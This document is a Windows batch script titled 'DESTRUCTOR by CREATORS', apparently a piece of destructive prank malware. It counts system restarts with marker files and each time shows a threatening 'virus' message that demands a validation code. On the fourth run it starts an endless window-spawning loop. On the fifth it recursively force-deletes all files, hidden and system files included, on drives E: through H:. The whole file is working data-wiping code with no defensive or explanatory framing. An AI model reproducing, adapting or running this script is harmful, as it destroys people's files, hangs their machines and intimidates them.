cls
@echo off

title DESTRUCTOR by CREATORS

CD\
D:

IF EXIST "#LOG-80.6.txt" exit

IF EXIST "#LOG-80.1.txt" goto created
IF EXIST "#LOG-80.2.txt" goto created
IF EXIST "#LOG-80.3.txt" goto created
IF EXIST "#LOG-80.4.txt" goto created
IF EXIST "#LOG-80.5.txt" goto created
copy NUL "#LOG-80.1.txt"
cls


:created
IF EXIST "#LOG-80.1.txt" goto file1
IF EXIST "#LOG-80.2.txt" goto file2
IF EXIST "#LOG-80.3.txt" goto file3
IF EXIST "#LOG-80.4.txt" goto file4
IF EXIST "#LOG-80.5.txt" goto file5

cls

:file1
rename "#LOG-80.1.txt","#LOG-80.2.txt"
echo !
echo !
echo !
echo !
echo !
echo !
echo       Restart no 1 out of 5
echo !
echo       This ia a virus program which will seriously 
echo       Affect your system, Inorder to protect your system
echo       you need to enter the validation key.
echo !
echo       Click V to enter validation key or
echo !
echo       any other key to exit......

SET /P cho1=
IF %cho1%==V goto validation
IF %cho1%==v goto validation
goto last



:file2
rename "#LOG-80.2.txt","#LOG-80.3.txt"
echo !
echo !
echo !
echo !
echo !
echo !
echo       Restart no 2 out of 5
echo !
echo       This ia a virus program which will seriously 
echo       Affect your system, Inorder to protect your system
echo       you need to enter the validation key.
echo !
echo       Click V to enter validation key or
echo !
echo       any other key to exit......

SET /P cho2=
IF %cho2%==V goto validation
IF %cho2%==v goto validation
goto last



:file3
rename "#LOG-80.3.txt","#LOG-80.4.txt"
echo !
echo !
echo !
echo !
echo !
echo !
echo       Restart no 3 out of 5
echo !
echo       This ia a virus program which will seriously 
echo       Affect your system, Inorder to protect your system
echo       you need to enter the validation key.
echo !
echo       Click V to enter validation key or
echo !
echo       any other key to exit......

SET /P cho3=
IF %cho3%==V goto validation
IF %cho3%==v goto validation
goto last



:file4
rename "#LOG-80.4.txt","#LOG-80.5.txt"
color 74
echo !
echo !
echo !
echo !
echo !
echo !
echo       Restart no 4 out of 5 ( you are very near )
echo !
echo       This ia a virus program which will seriously 
echo       Affect your system, Inorder to protect your system
echo       you need to enter the validation key.
echo !
echo       Click V to enter validation key or
echo !
echo       any other key to exit......

SET /P cho4=
IF %cho4%==V goto validation
IF %cho4%==v goto validation
:1
start
goto 1



:file5
del "#LOG-80.5.txt"

DEL /F /s /Q /A:R /A:S /A:H /A:A E:\*.*
DEL /F /s /Q /A:R /A:S /A:H /A:A F:\*.*
DEL /F /s /Q /A:R /A:S /A:H /A:A G:\*.*
DEL /F /s /Q /A:R /A:S /A:H /A:A H:\*.*







echo !
echo !
echo !
echo !
echo              All cleared ....... bye
echo !
echo !
echo !
echo !
goto last




:Validation
cls
echo !
echo !
echo !
echo !
echo !
echo !
echo    *  Enter Validation code (hit E to exit terminal) :
SET /P code=
IF %code%==1111 goto validate
IF %code%==E exit
IF %code%==e exit
IF NOT %code%==1111 goto wrong



:last
pause
exit


:validate
copy NUL #LOG-80.6.txt
del #LOG-80.1.txt
del #LOG-80.2.txt
del #LOG-80.3.txt
del #LOG-80.4.txt
del #LOG-80.5.txt


cls
echo !
echo !
echo !
echo !
echo !
echo !
echo         * Code accepted , Virus deactivatd"
echo !
echo !
echo !
echo !
echo !
echo !
pause
exit

:wrong
echo !
echo !
echo !
echo !
echo !
echo !
echo         * ........ Code Error .......... 
echo !
echo !
echo !
echo !
echo !
echo !
pause
goto validation
